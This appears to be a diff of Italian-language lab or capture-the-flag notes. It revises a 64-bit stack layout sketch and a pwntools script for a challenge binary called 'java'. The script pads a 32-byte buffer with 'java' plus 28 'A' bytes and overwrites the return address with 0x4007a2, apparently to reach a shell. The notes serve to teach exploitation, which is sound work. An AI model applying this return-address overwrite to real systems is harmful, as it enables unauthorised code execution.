@@ -38,21 +38,22 @@
 
 3)java
 
-STACK:
-  RIP => 8Bytes
-  RBP => 8Bytes
-  user.call=> 8Bytes
-  array[32]
+	possiamo osservare con gdb che siamo in un'architettura a 64bit
+	STACK
+	......
+	call => 8 B
+	buffer [32]
+	ptr alla base => 8 B
+	ind ritorno => 8 B
+	
 
-    from pwn import *
-    p=process('./java')
-    target = p64(0x4007a2)
-    
-    payload = b'java' + b'A'*(28) + target  #nota: importante perchè così il programma non termina e posso usare la bash in santa pace
-    #payload = payload.encode("ascii")
-    msgin = payload + target
-    p = process("./java")
-    p.sendline(payload)
-    p.interactive()
+	from pwn import *
+	p=process('./java')
+	garbage=b"java" + b'A'*28
+	target=p64(0x00000000004007a2)
+	
+	payload=garbage + target
+	p.sendline(payload)
+	p.interactive()
 
   
